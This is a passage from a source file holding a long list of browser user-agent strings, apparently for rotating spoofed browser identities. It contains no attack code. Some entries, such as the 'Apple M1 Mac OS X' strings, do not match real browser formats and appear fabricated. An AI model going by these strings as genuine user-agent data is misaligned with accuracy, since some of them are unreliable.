		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
		// ======================== SAFARI 2025-2026 EXPANDED ========================
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.1 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
		// ======================== iOS 2026 EXPANDED ========================
		"Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7 Mobile/15E148 Safari/604.1",
		// ======================== iOS Chrome / Firefox ========================
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.90 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.69 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.90 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/134.0 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/133.0 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/132.0 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/134.0 Mobile/15E148 Safari/605.1.15",
		// ======================== ANDROID 2025-2026 EXPANDED ========================
		"Mozilla/5.0 (Linux; Android 15; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S926U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S921U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 9a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 8a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-A356B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-A256B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; OnePlus 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; V2303A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; 2312DRA50G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-F741B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-F936B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-F721B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		// ======================== ANDROID TABLETS ========================
		"Mozilla/5.0 (Linux; Android 14; SM-X810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-X710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-X510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		// ======================== ANDROID FIREFOX ========================
		"Mozilla/5.0 (Android 15; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0",
		"Mozilla/5.0 (Android 15; Mobile; rv:137.0) Gecko/137.0 Firefox/137.0",
		"Mozilla/5.0 (Android 15; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0",
		"Mozilla/5.0 (Android 15; Mobile; rv:135.0) Gecko/135.0 Firefox/135.0",
		"Mozilla/5.0 (Android 15; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0",
		"Mozilla/5.0 (Android 14; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0",
		"Mozilla/5.0 (Android 14; Mobile; rv:133.0) Gecko/133.0 Firefox/133.0",
		"Mozilla/5.0 (Android 14; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0",
		"Mozilla/5.0 (Android 14; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0",
		"Mozilla/5.0 (Android 14; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0",
		// ======================== OPERA 2025-2026 ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/121.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/120.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/119.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/118.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/116.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/115.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/121.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/120.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/119.0.0.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/121.0.0.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/120.0.0.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/119.0.0.0",
		// ======================== VIVALDI 2025-2026 ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Vivaldi/7.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Vivaldi/7.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Vivaldi/7.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Vivaldi/7.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Vivaldi/7.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Vivaldi/7.1",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Vivaldi/7.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Vivaldi/7.0",
		// ======================== BRAVE 2025-2026 ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Brave/135",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Brave/134",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Brave/133",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Brave/132",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Brave/130",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Brave/129",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Brave/135",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Brave/134",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Brave/135",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Brave/134",
		// ======================== SAMSUNG INTERNET ========================
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-S916B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-A356B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-X810) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-X710) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Safari/537.36",
		// ======================== OPERA MOBILE ========================
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 OPR/76.0.0.0",
		"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 OPR/75.0.0.0",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 OPR/76.0.0.0",
		"Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 OPR/75.0.0.0",
		// ======================== YANDEX BROWSER ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 YaBrowser/25.1.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 YaBrowser/24.11.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 YaBrowser/25.1.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36",
		// ======================== UC BROWSER ========================
		"Mozilla/5.0 (Linux; U; Android 15; en-US; SM-S928B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.0.0 UCBrowser/16.5.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 14; en-US; SM-S918B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.0.0 UCBrowser/16.4.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 14; en-US; Pixel 8 Build/UQ1A.240205.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.0.0 UCBrowser/16.4.0.0 Mobile Safari/537.36",
		// ======================== EDGE MOBILE ========================
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 EdgA/131.0.0.0",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 EdgA/131.0.0.0",
		"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 EdgA/130.0.0.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/131.0.2903.87 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/130.0.2849.68 Mobile/15E148 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/129.0.2792.81 Mobile/15E148 Safari/605.1.15",
		// ======================== CHROMEOS ========================
		"Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14816.99.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14695.166.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14695.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14588.123.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS aarch64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS aarch64 14816.99.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS aarch64 14695.166.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		// ======================== WINDOWS ARM ========================
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
		// ======================== APPLE SILICON MAC ========================
		"Mozilla/5.0 (Macintosh; Apple M1 Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Apple M2 Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Apple M3 Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Apple M3 Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
